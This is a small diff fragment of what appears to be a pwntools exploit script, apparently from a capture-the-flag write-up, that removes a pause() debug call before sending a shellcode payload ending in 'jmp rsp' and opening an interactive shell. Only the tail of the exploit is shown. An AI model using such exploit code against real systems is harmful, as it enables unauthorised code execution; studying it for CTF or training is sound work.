@@ -108,7 +108,6 @@ payload += asm('''
     jmp rsp;
 ''')        # 128 we found with r2
 
-pause()
 p.sendlineafter('RSP!\n', payload)
 p.interactive()
 ```
